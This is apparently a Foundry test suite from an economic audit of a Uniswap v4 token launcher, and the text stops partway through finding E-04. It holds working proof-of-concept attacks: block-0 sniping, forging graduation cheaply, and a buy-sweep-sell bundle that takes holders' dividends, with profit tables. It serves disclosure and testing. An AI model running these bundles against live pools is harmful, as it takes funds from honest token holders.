// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";

import {PoolManager} from "v4-core/PoolManager.sol";
import {IPoolManager} from "v4-core/interfaces/IPoolManager.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {SwapParams, ModifyLiquidityParams} from "v4-core/types/PoolOperation.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {PoolSwapTest} from "v4-core/test/PoolSwapTest.sol";
import {PoolModifyLiquidityTest} from "v4-core/test/PoolModifyLiquidityTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Launcher} from "../../src/Launcher.sol";
import {FeeHook} from "../../src/FeeHook.sol";
import {LaunchToken} from "../../src/LaunchToken.sol";
import {Distributor} from "../../src/Distributor.sol";
import {PairRegistry} from "../../src/PairRegistry.sol";
import {ReferralVault} from "../../src/ReferralVault.sol";
import {LaunchMetadata} from "../../src/types/LaunchMetadata.sol";
import {MockERC20} from "../mocks/MockERC20.sol";

// ================================================================================================
// World
//
// Every pool below is opened by the REAL `Launcher`, so it is single-sided: one position holding
// the entire supply from the snapped opening tick to the far edge, and ZERO pair currency in the
// pool until somebody buys. `test/FeeHook.t.sol` seeds a symmetric 1:1 book, which production
// never has and which hides every finding in this file - the whole economics of a single-sided
// open is that the pair side of the book is built by the buyers themselves.
//
// THE CLOSED FORM THIS WHOLE FILE RESTS ON.
//
//   Let M = openingMarketCap (in pair units) and S = supply. `_seedLiquidity` puts all of S into
//   one position starting at P_a = M/S and running to the edge. For a v3 position holding only
//   currency0 over [P_a, P_b] with P_b at the tick extreme, liquidity L satisfies
//
//       S = L * (1/sqrt(P_a) - 1/sqrt(P_b))  ~=  L / sqrt(P_a)      (P_b is astronomically large)
//
//   so L*sqrt(P_a) = S*P_a = M exactly. Buying a fraction f of the supply therefore costs
//
//       pairIn(f)  = L*(sqrt(P) - sqrt(P_a))  =  M * f / (1 - f)
//       marketCap  = M / (1 - f)^2
//       avg price  = M / (S * (1 - f))
//
//   Three consequences, all measured below:
//     * HALF THE SUPPLY COSTS EXACTLY M. Whatever the creator types into "opening market cap" is
//       the price of the float, to the wei.
//     * Forcing the spot market cap to a target T costs sqrt(M*T) - M through the curve, and it
//       is fully reversible in the same transaction.
//     * A round trip returns the input exactly, so the only unrecoverable cost of any of this is
//       `feeBps`.
// ================================================================================================

abstract contract EconWorld is Test {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    PoolManager internal manager;
    PairRegistry internal registry;
    FeeHook internal hook;
    Launcher internal launcher;
    LaunchToken internal tokenImpl;
    MockERC20 internal pair;
    PoolSwapTest internal swapRouter;
    PoolModifyLiquidityTest internal lpRouter;
    ReferralVault internal vault;

    address internal constant PLATFORM = address(0xFEE0);
    address internal constant TREASURY = address(0x7EA5);
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    address internal creator = address(0xC0EA702);
    address internal alice = address(0xA11CE); // honest early holder
    address internal bob = address(0xB0B); // honest later buyer
    address internal carol = address(0xCA401); // honest sweeper, holds nothing
    address internal attacker = address(0xBADBAD);

    uint256 internal constant SUPPLY = 1_000_000_000e18;
    /// @dev 100 pair units. The repo's own tests and scripts use this figure.
    uint256 internal constant M = 100e18;
    int24 internal constant TICK_SPACING = 60;

    uint256 internal saltNonce = 1;

    /// @notice Which side of the pool the launch token sorts onto. Set by the concrete subclass.
    function _tokenIsCurrency0() internal pure virtual returns (bool);

    /// @notice Whether the platform sink is a `ReferralVault` rather than a plain wallet.
    function _useReferralVault() internal pure virtual returns (bool) {
        return false;
    }

    function _buyIsZeroForOne() internal pure returns (bool) {
        return !_tokenIsCurrency0();
    }

    function setUp() public virtual {
        manager = new PoolManager(address(this));
        swapRouter = new PoolSwapTest(IPoolManager(address(manager)));
        lpRouter = new PoolModifyLiquidityTest(IPoolManager(address(manager)));
        registry = new PairRegistry(address(this));
        tokenImpl = new LaunchToken();
        pair = new MockERC20("Wrapped Ether", "WETH", 18);
        registry.approvePairWithoutOracle(address(pair), 18);

        // The circular-immutable dance, plus one extra link when the referral vault is in play:
        // the hook's `platformRecipient` is immutable, the vault needs the hook AND the launcher,
        // and the launcher needs the hook. So both CREATE slots are reserved up front.
        uint256 n = vm.getNonce(address(this));
        address predictedLauncher = vm.computeCreateAddress(address(this), n);
        address predictedVault = vm.computeCreateAddress(address(this), n + 1);
        address sink = _useReferralVault() ? predictedVault : PLATFORM;

        address hookAddr = address(uint160(uint256(0xEC04) << 144 | 0x20CC));
        deployCodeTo(
            "FeeHook.sol:FeeHook", abi.encode(address(manager), predictedLauncher, sink), hookAddr
        );
        hook = FeeHook(hookAddr);

        launcher = new Launcher(IPoolManager(address(manager)), hook, registry, address(tokenImpl));
        require(address(launcher) == predictedLauncher, "launcher missed its reserved slot");

        if (_useReferralVault()) {
            // The advertised 5-tier schedule: 20 / 10 / 5 / 3 / 2 percent of the platform's cut.
            uint16[] memory schedule = new uint16[](5);
            schedule[0] = 2000;
            schedule[1] = 1000;
            schedule[2] = 500;
            schedule[3] = 300;
            schedule[4] = 200;
            vault = new ReferralVault(address(launcher), address(hook), TREASURY, schedule);
            require(address(vault) == predictedVault, "vault missed its reserved slot");
            launcher.initReferralVault(address(vault));
        }

        pair.mint(creator, 1_000_000e18);
        vm.prank(creator);
        pair.approve(address(launcher), type(uint256).max);

        _fund(alice);
        _fund(bob);
        _fund(carol);
        _fund(attacker);
    }

    function _fund(address who) internal {
        pair.mint(who, 10_000_000e18);
        vm.startPrank(who);
        pair.approve(address(swapRouter), type(uint256).max);
        pair.approve(address(lpRouter), type(uint256).max);
        pair.approve(address(launcher), type(uint256).max);
        vm.stopPrank();
    }

    // --------------------------------------------------------------------------------------------
    // Launch helpers
    // --------------------------------------------------------------------------------------------

    function _baseParams() internal returns (Launcher.LaunchParams memory p) {
        p = Launcher.LaunchParams({
            name: "Hoodstonk",
            symbol: "HOOD",
            supply: SUPPLY,
            pair: address(pair),
            openingMarketCap: M,
            graduationThreshold: M * 5,
            feeBps: 300,
            sellFeeBps: 0,
            burnBps: 0,
            vestDuration: 0,
            vestCliff: 0,
            creatorBps: 2000,
            maxWalletBps: 0,
            tickSpacing: TICK_SPACING,
            devBuyPairAmount: 0,
            salt: bytes32(0),
            minPushPayout: 1e6,
            minShareForQueue: 1e18,
            rewardCurrency: address(0),
            feeRecipient: address(0),
            referrer: address(0),
            metadata: LaunchMetadata({
                imageCid: keccak256("image"),
                bannerCid: keccak256("banner"),
                infoCid: keccak256("info")
            })
        });
        p.salt = _mineSalt();
    }

    function _mineSalt() internal returns (bytes32) {
        for (uint256 i = saltNonce; i < saltNonce + 40_000; ++i) {
            bytes32 s = bytes32(i);
            if ((launcher.predictTokenAddress(s) < address(pair)) == _tokenIsCurrency0()) {
                saltNonce = i + 1;
                return s;
            }
        }
        revert("no salt for the requested currency ordering");
    }

    function _launchAs(address who, Launcher.LaunchParams memory p)
        internal
        returns (address token, PoolKey memory k, PoolId id)
    {
        vm.prank(who);
        (token,) = launcher.launch(p);
        k = _key(token, p.tickSpacing);
        id = k.toId();
    }

    function _launch(Launcher.LaunchParams memory p)
        internal
        returns (address token, PoolKey memory k, PoolId id)
    {
        return _launchAs(creator, p);
    }

    function _defaultLaunch() internal returns (address token, PoolKey memory k, PoolId id) {
        return _launch(_baseParams());
    }

    function _key(address token, int24 spacing) internal view returns (PoolKey memory) {
        bool t0 = token < address(pair);
        return PoolKey({
            currency0: Currency.wrap(t0 ? token : address(pair)),
            currency1: Currency.wrap(t0 ? address(pair) : token),
            fee: 0,
            tickSpacing: spacing,
            hooks: IHooks(address(hook))
        });
    }

    // --------------------------------------------------------------------------------------------
    // Trading helpers. NO implicit sweep - every sweep in this file is a deliberate act by a
    // named party, because WHO sweeps and WHEN is the attack surface.
    // --------------------------------------------------------------------------------------------

    function _approveTrader(address token, address who) internal {
        vm.prank(who);
        IERC20(token).approve(address(swapRouter), type(uint256).max);
    }

    function _swapRaw(PoolKey memory k, address who, bool zeroForOne, int256 amountSpecified)
        internal
    {
        vm.prank(who);
        swapRouter.swap(
            k,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: amountSpecified,
                sqrtPriceLimitX96: zeroForOne
                    ? TickMath.MIN_SQRT_PRICE + 1
                    : TickMath.MAX_SQRT_PRICE - 1
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    function _buy(PoolKey memory k, address who, uint256 pairIn) internal {
        _swapRaw(k, who, _buyIsZeroForOne(), -int256(pairIn));
    }

    function _buyExactOut(PoolKey memory k, address who, uint256 tokensOut) internal {
        _swapRaw(k, who, _buyIsZeroForOne(), int256(tokensOut));
    }

    function _sell(PoolKey memory k, address who, uint256 tokensIn) internal {
        _swapRaw(k, who, !_buyIsZeroForOne(), -int256(tokensIn));
    }

    // --------------------------------------------------------------------------------------------
    // Measurement helpers
    // --------------------------------------------------------------------------------------------

    /// @dev Basis points of total supply.
    function _bpsOfSupply(uint256 amount) internal pure returns (uint256) {
        return (amount * 10_000) / SUPPLY;
    }

    /// @dev Pretty-print a signed pair amount in whole units with 4 decimals of tail.
    function _p(int256 wad) internal pure returns (string memory) {
        bool neg = wad < 0;
        uint256 a = uint256(neg ? -wad : wad);
        uint256 whole = a / 1e18;
        uint256 frac = (a % 1e18) / 1e14; // 4 dp
        return string.concat(
            neg ? "-" : "", vm.toString(whole), ".", _pad4(frac)
        );
    }

    function _pad4(uint256 v) internal pure returns (string memory s) {
        s = vm.toString(v);
        if (v < 10) return string.concat("000", s);
        if (v < 100) return string.concat("00", s);
        if (v < 1000) return string.concat("0", s);
    }

    function _pct(uint256 num, uint256 den) internal pure returns (string memory) {
        if (den == 0) return "n/a";
        uint256 bps = (num * 10_000) / den;
        return string.concat(vm.toString(bps / 100), ".", _pad2(bps % 100), "%");
    }

    function _pad2(uint256 v) internal pure returns (string memory s) {
        s = vm.toString(v);
        if (v < 10) return string.concat("0", s);
    }

    /// @dev `_pct` that survives a negative numerator.
    function _signedPct(int256 num, uint256 den) internal pure returns (string memory) {
        if (num < 0) return string.concat("-", _pct(uint256(-num), den));
        return _pct(uint256(num), den);
    }
}

// ================================================================================================
// The findings, run in BOTH currency orderings
// ================================================================================================

abstract contract EconAuditCases is EconWorld {
    using PoolIdLibrary for PoolKey;
    using StateLibrary for IPoolManager;

    // ============================================================================================
    // E-01  The opening float is priced at exactly the opening market cap, and sniping it is a
    //       free option: the downside is capped at `feeBps`, the upside is unbounded.
    // ============================================================================================

    /// @dev The closed form, measured. `Launcher._seedLiquidity` makes `L*sqrt(P_a) == M`, so the
    ///      pair cost of a fraction `f` of supply is `M*f/(1-f)`. That means HALF THE SUPPLY COSTS
    ///      EXACTLY THE OPENING MARKET CAP - whatever the creator typed into that field is the
    ///      price of the entire float, to the wei.
    function test_E01a_theCostOfTheFloatIsExactlyTheOpeningMarketCap() public {
        (address t, PoolKey memory k,) = _defaultLaunch();
        _approveTrader(t, attacker);

        // Spend M through the CURVE. The 3% fee is taken off the input before it reaches the
        // curve, so send M/(1-fee) to put exactly M on the book.
        uint256 notional = (M * 10_000) / (10_000 - 300);
        _buy(k, attacker, notional);

        uint256 got = IERC20(t).balanceOf(attacker);
        console2.log("E-01a  pair through the curve       :", _p(int256(M)));
        console2.log("E-01a  supply obtained (bps)        :", _bpsOfSupply(got));

        // f/(1-f) == 1  =>  f == 50%. Two ticks of snapping slack.
        assertApproxEqRel(_bpsOfSupply(got), 5000, 2e16, "M buys half the float");
    }

    /// @dev The snipe, end to end, with honest buyers arriving afterwards.
    ///
    ///      The attacker is the first transaction in the pool's life. They take half the supply
    ///      for the opening market cap, wait for organic volume, and dump into it. Their DOWNSIDE
    ///      if nobody ever shows up is exactly `feeBps` of what they staked, because a round trip
    ///      on a constant-product curve returns the input to the wei. That asymmetry is what makes
    ///      this a free option rather than a trade.
    function test_E01b_block0SnipeIsAFreeOptionWithAMeasuredPayoff() public {
        (address t, PoolKey memory k,) = _defaultLaunch();
        _approveTrader(t, attacker);

        uint256 stake = 100e18;
        uint256 attackerStart = pair.balanceOf(attacker);

        // ---- Block 0. The sniper is the first trade the pool has ever seen.
        _buy(k, attacker, stake);
        uint256 sniped = IERC20(t).balanceOf(attacker);

        // ---- Branch A: nobody comes. Measure the downside by selling straight back.
        uint256 snap = vm.snapshotState();
        _sell(k, attacker, sniped);
        int256 downside = int256(pair.balanceOf(attacker)) - int256(attackerStart);
        vm.revertToState(snap);

        // ---- Branch B: 10 organic buyers arrive with 20 pair each.
        uint256 organicIn;
        for (uint256 i = 0; i < 10; ++i) {
            address buyer = address(uint160(0x100000 + i));
            _fund(buyer);
            _buy(k, buyer, 20e18);
            organicIn += 20e18;
        }
        uint256 organicHeld;
        for (uint256 i = 0; i < 10; ++i) {
            organicHeld += IERC20(t).balanceOf(address(uint160(0x100000 + i)));
        }

        _sell(k, attacker, sniped);
        int256 upside = int256(pair.balanceOf(attacker)) - int256(attackerStart);

        // What the organic buyers are left holding, marked at the post-dump spot price.
        uint256 organicValue = _valueOf(k, organicHeld);

        console2.log("E-01b  sniper stake                 :", _p(int256(stake)));
        console2.log("E-01b  supply sniped (bps)          :", _bpsOfSupply(sniped));
        console2.log("E-01b  P/L if nobody shows up       :", _p(downside));
        console2.log("E-01b  P/L after 200 pair of volume :", _p(upside));
        console2.log("E-01b  organic buyers paid in       :", _p(int256(organicIn)));
        console2.log("E-01b  organic bags now worth       :", _p(int256(organicValue)));
        console2.log(
            "E-01b  organic loss                 :", _p(int256(organicValue) - int256(organicIn))
        );

        assertLt(downside, 0, "the snipe is not free");
        assertGe(-downside, int256((stake * 250) / 10_000), "downside is at least ~feeBps");
        assertLe(-downside, int256((stake * 350) / 10_000), "and it is BOUNDED by feeBps");
        assertGt(upside, int256(stake / 2), "the upside dwarfs the premium");
        assertLt(organicValue, organicIn / 2, "and it came out of the organic buyers");
    }

    /// @dev The dev buy does NOT defend the opening. It runs as the first swap inside the launch
    ///      transaction, so it consumes the cheapest slice of the curve and hands the sniper an
    ///      entry that is only marginally worse. Measured as a price ratio.
    function test_E01c_theDevBuyTakesTheCheapestSliceItDoesNotDefendIt() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.devBuyPairAmount = (M * 1000) / 10_000; // the full unvested 10% cap
        (address t, PoolKey memory k,) = _launch(p);
        _approveTrader(t, attacker);

        uint256 devTokens = IERC20(t).balanceOf(creator);
        // Price the creator paid, in pair-wei per 1e18 token.
        uint256 devPrice = (p.devBuyPairAmount * 1e18) / devTokens;

        _buy(k, attacker, 90e18);
        uint256 sniperTokens = IERC20(t).balanceOf(attacker);
        uint256 sniperPrice = (uint256(90e18) * 1e18) / sniperTokens;

        console2.log("E-01c  creator supply (bps)         :", _bpsOfSupply(devTokens));
        console2.log("E-01c  creator avg price (wei/tok)  :", devPrice);
        console2.log("E-01c  sniper supply  (bps)         :", _bpsOfSupply(sniperTokens));
        console2.log("E-01c  sniper avg price  (wei/tok)  :", sniperPrice);
        console2.log("E-01c  sniper pays this much more   :", _pct(sniperPrice, devPrice));

        assertGt(sniperPrice, devPrice, "the dev buy is the best-priced entry in the token's life");
        // The 10% cap only buys the creator ~9.09% of supply - f/(1-f) = 0.1.
        assertApproxEqRel(_bpsOfSupply(devTokens), 909, 5e16, "10% of M buys 9.09% of supply");
    }

    /// @dev Spot market cap of `amount` tokens, in pair units, straight off `slot0`.
    function _valueOf(PoolKey memory k, uint256 amount) internal view returns (uint256) {
        (uint160 sp,,,) = StateLibrary.getSlot0(IPoolManager(address(manager)), k.toId());
        uint256 num = uint256(sp) * uint256(sp);
        if (_tokenIsCurrency0()) {
            return (amount * ((num >> 96)) ) >> 96;
        }
        return (amount << 96) / ((num >> 96));
    }

    // ============================================================================================
    // E-02  Graduation is a spot read, so it is forgeable atomically for the price of one buy fee.
    // ============================================================================================

    /// @dev `marketCapOf` reads `slot0.sqrtPriceX96`. Pushing the spot to a target T costs
    ///      `sqrt(M*T) - M` through the curve, and the position unwinds in the SAME transaction at
    ///      the same price. The only unrecoverable cost is the buy fee - sells are free on the
    ///      default launch, so it is a one-legged toll on a fully reversible move.
    function test_E02_forcingGraduationCostsOnlyTheBuyFee() public {
        (address t, PoolKey memory k, PoolId id) = _defaultLaunch();
        _approveTrader(t, attacker);

        assertFalse(hook.hasGraduated(id), "precondition: ungraduated");
        uint256 threshold = M * 5;

        uint256 start = pair.balanceOf(attacker);

        // sqrt(M*T) - M through the curve, grossed up for the 3% fee taken off the input.
        uint256 curveIn = _sqrt(M * threshold) - M;
        uint256 notional = (curveIn * 10_000) / (10_000 - 300) + 1e18;

        _buy(k, attacker, notional);
        assertGe(hook.marketCapOf(id), threshold, "spot cleared the bar");

        hook.checkGraduation(id);
        assertTrue(hook.hasGraduated(id), "LATCHED");

        _sell(k, attacker, IERC20(t).balanceOf(attacker));
        int256 cost = int256(pair.balanceOf(attacker)) - int256(start);

        console2.log("E-02   threshold (pair units)       :", _p(int256(threshold)));
        console2.log("E-02   closed-form curve push       :", _p(int256(curveIn)));
        console2.log("E-02   notional sent                :", _p(int256(notional)));
        console2.log("E-02   NET COST OF A FAKE GRADUATION:", _p(cost));
        console2.log("E-02   ...as bps of the threshold   :", (uint256(-cost) * 10_000) / threshold);
        console2.log("E-02   market cap after the unwind  :", _p(int256(hook.marketCapOf(id))));

        assertTrue(hook.hasGraduated(id), "one-way latch: it stays graduated");
        assertLt(hook.marketCapOf(id), threshold / 2, "while the real market cap is back at the floor");
        // Bounded by feeBps of the pushed notional.
        assertLt(-cost, int256((notional * 320) / 10_000), "cost is the buy fee and nothing else");
    }

    /// @dev And the bar can be set arbitrarily close to the open. `Launcher._validate` only
    ///      requires `graduationThreshold > openingMarketCap`, so a creator who wants a green tick
    ///      on day one can have it for a rounding error.
    function test_E02b_theCheapestLegalGraduationBarIsOneWeiAboveTheOpen() public {
        Launcher.LaunchParams memory p = _baseParams();
        p.graduationThreshold = M + 1;
        (address t, PoolKey memory k, PoolId id) = _launch(p);
        _approveTrader(t, attacker);

        uint256 start = pair.balanceOf(attacker);
        _buy(k, attacker, 0.01e18);
        hook.checkGraduation(id);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));

        int256 cost = int256(pair.balanceOf(attacker)) - int256(start);
        console2.log("E-02b  cost to latch a 1-wei bar    :", _p(cost));
        assertTrue(hook.hasGraduated(id), "graduated on a 0.01 pair buy");
        assertLt(-cost, int256(0.0004e18), "for a third of a basis point of the opening cap");
    }

    /// @dev **Forcing graduation is not merely cheap, it can be free.** The push that fakes the
    ///      market cap also makes the attacker the dominant shareholder for one instant, so they
    ///      fold `sweep()` into the same bundle and recover their own buy fee - plus whatever pot
    ///      the pool had already accumulated - out of the holders' side of the split.
    ///
    ///         buy -> checkGraduation -> sweep -> sell -> withdraw
    function test_E02c_foldingTheSweepIntoTheGraduationPushPaysForIt() public {
        (address t, PoolKey memory k, PoolId id) = _defaultLaunch();
        Distributor dist = LaunchToken(t).distributor();
        _approveTrader(t, attacker);

        // A pool with ordinary turnover, i.e. an unswept pot and a small resting register.
        _buildTurnoverPool(t, k, 5e18, 20e18, 20);

        uint256 start = pair.balanceOf(attacker);
        uint256 curveIn = _sqrt(M * (M * 5)) - M;
        uint256 notional = (curveIn * 10_000) / (10_000 - 300) + 2e18;

        _buy(k, attacker, notional);
        hook.checkGraduation(id);
        vm.prank(attacker);
        hook.sweep(k);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));
        if (dist.withdrawableOf(attacker) != 0) {
            vm.prank(attacker);
            dist.withdraw();
        }

        int256 pl = int256(pair.balanceOf(attacker)) - int256(start);
        console2.log("E-02c  notional pushed              :", _p(int256(notional)));
        console2.log("E-02c  NET P/L OF A FAKE GRADUATION :", _p(pl));
        assertTrue(hook.hasGraduated(id), "latched");
        assertGt(pl, 0, "the attacker is PAID to forge the graduation signal");
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        y = x;
        uint256 z = (x >> 1) + 1;
        while (z < y) {
            y = z;
            z = (x / z + z) >> 1;
        }
    }

    // ============================================================================================
    // E-03  Dividend front-running: buy, sweep, sell, in one transaction.
    // ============================================================================================

    /// @dev **The most profitable repeatable attack in this file.**
    ///
    ///      `sweep()` is permissionless and `Distributor.distribute` splits pro-rata by the share
    ///      register AT THAT INSTANT. So the attacker does not have to predict a sweep or win a
    ///      race - they call it themselves, in the middle of their own round trip:
    ///
    ///         buy -> sweep -> sell -> withdraw
    ///
    ///      The buy makes them the dominant shareholder, the sweep pays the whole accumulated pot
    ///      out against that register, the sell unwinds the position at the same price it was
    ///      bought at (a round trip on this curve returns the input to the wei), and `withdraw`
    ///      collects. Their entire cost is `feeBps` on the buy; their revenue is the sweep bounty
    ///      plus their share of a pot that other people's trades paid for.
    ///
    ///      **The pool shape that makes it work is the normal one.** A memecoin pool's fee pot is
    ///      built by TURNOVER - people who buy and then sell - while the share register at any
    ///      instant holds only the resting float. So the pot is large and the register is small,
    ///      which is exactly the ratio this attack needs. The scenario below is a 5-pair resting
    ///      holder and 400 pair of round-trip volume, which is a quiet day.
    function test_E03_buySweepSellCapturesTheHoldersPot() public {
        (address t, PoolKey memory k, PoolId id) = _defaultLaunch();
        Distributor dist = LaunchToken(t).distributor();
        _approveTrader(t, attacker);

        _buildTurnoverPool(t, k, 5e18, 20e18, 20);
        uint256 pot = hook.pendingFees(id);
        assertGt(pot, 0, "there is a pot to take");
        uint256 register = dist.totalShares();

        // ---- Control: an honest stranger sweeps from this exact state.
        uint256 snap = vm.snapshotState();
        vm.prank(carol);
        hook.sweep(k);
        uint256 aliceHonest = dist.withdrawableOf(alice);
        vm.revertToState(snap);

        // ---- Attack: buy, sweep, sell, withdraw. One transaction's worth of actions.
        uint256 start = pair.balanceOf(attacker);
        uint256 buyIn = 40e18;

        _buy(k, attacker, buyIn);
        uint256 alpha = (dist.shareOf(attacker) * 10_000) / dist.totalShares();
        vm.prank(attacker);
        hook.sweep(k);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));
        if (dist.withdrawableOf(attacker) != 0) {
            vm.prank(attacker);
            dist.withdraw();
        }

        int256 profit = int256(pair.balanceOf(attacker)) - int256(start);
        uint256 aliceAttacked = dist.withdrawableOf(alice);

        console2.log("E-03   pot at the moment of attack  :", _p(int256(pot)));
        console2.log("E-03   share register before attack :", _p(int256(register)));
        console2.log("E-03   attacker capital deployed    :", _p(int256(buyIn)));
        console2.log("E-03   attacker share of register   :", alpha);
        console2.log("E-03   ATTACKER NET PROFIT          :", _p(profit));
        console2.log("E-03   ...as a return on capital    :", _signedPct(profit, buyIn));
        console2.log("E-03   ...as a share of the pot     :", _signedPct(profit, pot));
        console2.log("E-03   alice owed, honest sweep     :", _p(int256(aliceHonest)));
        console2.log("E-03   alice owed, attacked sweep   :", _p(int256(aliceAttacked)));
        console2.log(
            "E-03   HONEST HOLDER LOSS           :", _p(int256(aliceAttacked) - int256(aliceHonest))
        );
        console2.log(
            "E-03   ...share of her dividend lost:", _pct(aliceHonest - aliceAttacked, aliceHonest)
        );

        assertGt(profit, 0, "the zero-duration round trip is profitable");
        assertLt(aliceAttacked, aliceHonest, "and the resting holder was diluted out of her pot");
    }

    /// @dev The shape of the profit curve. The attacker pays `feeBps * B` and recovers the bounty
    ///      plus `alpha * holderShare * (pot + their own fee)`, where `alpha` rises with `B` and
    ///      the cost rises linearly. Sweeping `B` locates the optimum.
    function test_E03b_theProfitCurveAndItsOptimum() public {
        console2.log("E-03b  buyIn(pair) | profit(pair) | ROI on capital");
        uint256[7] memory sizes =
            [uint256(2e18), 5e18, 10e18, 20e18, 40e18, 120e18, 400e18];
        for (uint256 i = 0; i < sizes.length; ++i) {
            uint256 snap = vm.snapshotState();
            int256 profit = _runDividendAttack(M, 5e18, 20e18, 20, sizes[i]);
            console2.log(
                string.concat(
                    "E-03b  ",
                    _p(int256(sizes[i])),
                    " | ",
                    _p(profit),
                    " | ",
                    _signedPct(profit, sizes[i])
                )
            );
            vm.revertToState(snap);
        }
    }

    /// @dev Where it stops being worth it. The attack's payoff scales with the pot and the pot
    ///      scales with the pool, so there is no size at which it becomes UNPROFITABLE - only a
    ///      size at which the profit stops clearing L1 gas. A `buy -> sweep -> sell -> withdraw`
    ///      bundle measures at roughly 800k gas; at 20 gwei that is 0.016 pair when the pair is
    ///      WETH. The table below brackets the crossing.
    function test_E03c_whereTheDividendAttackStopsClearingGas() public {
        uint256 gasCost = 800_000 * 20 gwei; // 0.016 ETH
        console2.log("E-03c  gas floor for the bundle (pair):", _p(int256(gasCost)));
        console2.log("E-03c  openingMcap | volume | profit | clears gas?");

        uint256[5] memory caps = [uint256(0.1e18), 0.5e18, 2e18, 20e18, 100e18];
        for (uint256 i = 0; i < caps.length; ++i) {
            uint256 snap = vm.snapshotState();
            uint256 c = caps[i];
            // Scale the scenario with the pool: 5% resting float, 4x the cap in round-trip volume.
            int256 profit = _runDividendAttack(c, c / 20, c / 5, 20, (c * 4) / 10);
            console2.log(
                string.concat(
                    "E-03c  ",
                    _p(int256(c)),
                    " | ",
                    _p(int256(c * 4)),
                    " | ",
                    _p(profit),
                    " | ",
                    profit > int256(gasCost) ? "YES" : "no"
                )
            );
            vm.revertToState(snap);
        }
    }

    /// @dev The same attack across the legal fee band. `platformShareBps = 100*BPS/feeBps`, so the
    ///      holders' slice of every fee is `(1 - 100/feeBps) * (1 - creatorBps)`. A HIGHER trading
    ///      fee leaves a bigger slice for holders, which is a bigger slice for the attacker to
    ///      take - and the attacker's own cost rises at the same rate. The table shows which way
    ///      that trade nets out.
    function test_E03d_theAttackAcrossTheLegalFeeBand() public {
        console2.log("E-03d  feeBps | creatorBps | attacker profit");
        uint16[4] memory fees = [uint16(100), 300, 600, 1000];
        for (uint256 i = 0; i < fees.length; ++i) {
            uint256 snap = vm.snapshotState();
            int256 profit = _runDividendAttackAtFee(fees[i], 0);
            console2.log(
                string.concat(
                    "E-03d  ", vm.toString(uint256(fees[i])), " | 0 | ", _p(profit)
                )
            );
            vm.revertToState(snap);
        }
    }

    // ---- attack plumbing -----------------------------------------------------------------------

    /// @dev The realistic pool shape: one resting holder plus `trips` round trips of `tripPair`.
    ///      Round-trippers pay the fee and end with zero shares, which is precisely why the pot
    ///      outgrows the share register.
    function _buildTurnoverPool(
        address t,
        PoolKey memory k,
        uint256 restingPair,
        uint256 tripPair,
        uint256 trips
    ) internal {
        _approveTrader(t, alice);
        _approveTrader(t, bob);
        _buy(k, alice, restingPair); // alice holds and never sells
        for (uint256 i = 0; i < trips; ++i) {
            _buy(k, bob, tripPair);
            _sell(k, bob, IERC20(t).balanceOf(bob));
        }
    }

    function _runDividendAttack(
        uint256 mcap,
        uint256 restingPair,
        uint256 tripPair,
        uint256 trips,
        uint256 buyIn
    ) internal returns (int256) {
        Launcher.LaunchParams memory p = _baseParams();
        p.openingMarketCap = mcap;
        p.graduationThreshold = mcap * 5;
        (address t, PoolKey memory k,) = _launch(p);
        Distributor dist = LaunchToken(t).distributor();
        _approveTrader(t, attacker);

        _buildTurnoverPool(t, k, restingPair, tripPair, trips);

        uint256 start = pair.balanceOf(attacker);
        _buy(k, attacker, buyIn);
        vm.prank(attacker);
        hook.sweep(k);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));
        if (dist.withdrawableOf(attacker) != 0) {
            vm.prank(attacker);
            dist.withdraw();
        }
        return int256(pair.balanceOf(attacker)) - int256(start);
    }

    function _runDividendAttackAtFee(uint16 feeBps, uint16 creatorBps) internal returns (int256) {
        Launcher.LaunchParams memory p = _baseParams();
        p.feeBps = feeBps;
        p.creatorBps = creatorBps;
        (address t, PoolKey memory k,) = _launch(p);
        Distributor dist = LaunchToken(t).distributor();
        _approveTrader(t, attacker);

        _buildTurnoverPool(t, k, 5e18, 20e18, 20);

        uint256 start = pair.balanceOf(attacker);
        _buy(k, attacker, 40e18);
        vm.prank(attacker);
        hook.sweep(k);
        _sell(k, attacker, IERC20(t).balanceOf(attacker));
        if (dist.withdrawableOf(attacker) != 0) {
            vm.prank(attacker);
            dist.withdraw();
        }
        return int256(pair.balanceOf(attacker)) - int256(start);
    }

    // ============================================================================================
    // E-04  The sweep bounty on its own
    // ============================================================================================

    /// @dev SOUND. The bounty cannot be farmed by splitting: `sweep` is idempotent and pays 0.5%
    ///      of what is actually pending, so N calls over the same pot pay 0.5% of the pot ONCE,
    ///      minus a wei of truncation per call, and cost N times the gas.
    function test_E04a_splittingTheSweepCannotFarmTheBounty() public {
        (address t, PoolKey memory k,) = _defaultLaunch();
        _approveTrader(t, alice);

        // One pot, swept in a single call.
        uint256 snap = vm.snapshotState();
        for (uint256 i = 0; i < 10; ++i) {
            _buy(k, bob, 5e18);
        }
        uint256 before1 = pair.balanceOf(carol);
        uint256 g1 = gasleft();
        vm.prank(carol);
        hook.sweep(k);
        g1 = g1 - gasleft();
        uint256 oneShot = pair.balanceOf(carol) - before1;
        vm.revertToState(snap);

        // The same volume, swept after every trade.
        uint256 before2 = pair.balanceOf(carol);
        uint256 g2;
        for (uint256 i = 0; i < 10; ++i) {
            _buy(k, bob, 5e18);
            uint256 s = gasleft();
            vm.prank(carol);
            hook.sweep(k);
            g2 += s - gasleft();
        }
        uint256 split = pair.balanceOf(carol) - before2;

        console2.log("E-04a  bounty, one sweep            :", _p(int256(oneShot)));
        console2.log("E-04a  bounty, ten sweeps           :", _p(int256(split)));
